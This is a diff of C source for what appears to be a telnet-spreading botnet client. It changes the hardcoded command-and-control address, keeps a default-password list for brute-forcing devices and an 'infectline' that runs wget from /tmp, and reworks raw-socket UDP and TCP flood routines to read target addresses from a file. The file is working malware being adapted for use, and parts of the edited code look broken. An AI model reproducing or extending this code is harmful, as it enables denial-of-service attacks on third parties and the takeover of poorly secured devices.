@@ -38,7 +38,7 @@ char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 
 
 unsigned char *commServer[] =
 {
-        "5.206.225.136:23"
+        "192.168.178.27:23"
 };
 
 int initConnection();
@@ -60,7 +60,13 @@ char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\
 
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
-
+struct list
+{
+	struct sockaddr_in data;
+	struct list *next;
+	struct list *prev;
+};
+struct list *head;
 void init_rand(uint32_t x)
 {
         int i;
@@ -971,6 +977,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
         register unsigned int pollRegister;
         pollRegister = pollinterval;
         head = NULL;
+	FILE *ips = fopen("ips.txt","r");
         int max_len = 128;
 	char *buffer = (char *) malloc(max_len);
 	buffer = memset(buffer, 0x00, max_len);
@@ -1000,7 +1007,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
 		}
 	}
 	struct list *current = head->next;
-
+                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                 if(!sockfd)
                 {
                         sockprintf(mainCommSock, "Failed opening raw socket.");
@@ -1075,6 +1082,7 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         register unsigned int pollRegister;
         pollRegister = pollinterval;
         head = NULL;
+	FILE *ips = fopen("ips.txt","r");
         int max_len = 128;
 	char *buffer = (char *) malloc(max_len);
 	buffer = memset(buffer, 0x00, max_len);
@@ -1263,7 +1271,7 @@ sockprintf(mainCommSock, "PROBING");
                         {
                                 if(!listFork())
                                 {
-                                        sendUDP(hi, port, time, spoofed, packetsize, pollinterval);
+                                        sendUDP(hi, port, time, packetsize, pollinterval);
                                         _exit(0);
                                 }
                                 hi = strtok(NULL, ",");
@@ -1307,7 +1315,7 @@ sockprintf(mainCommSock, "PROBING");
                 } else {
                         if (listFork()) { return; }
 
-                        sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
+                        sendTCP(ip, port, time, flags, psize, pollinterval);
                         _exit(0);
                 }
         }
